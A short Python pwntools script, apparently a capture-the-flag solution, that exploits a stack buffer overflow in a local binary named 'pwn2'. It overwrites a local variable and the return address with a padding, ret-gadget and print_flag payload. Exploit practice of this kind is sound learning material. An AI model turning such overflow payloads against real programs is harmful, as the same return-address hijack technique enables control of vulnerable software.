#!/usr/bin/python3

from pwn import *

exe = ELF('./pwn2', checksec=False)

r = process(exe.path)

rand = 0x513d25be # rbp - 0x4

print_flag = 0x4011d6

ret = 0x0000000000401016 
payload = b'a'* 44 + p32(rand) + p64(0) + p64(ret)  + p64(print_flag)
input()
r.sendlineafter(b'Insert your name: ', payload)
r.sendlineafter(b'Insert your surname: ', b'whatever')


r.interactive()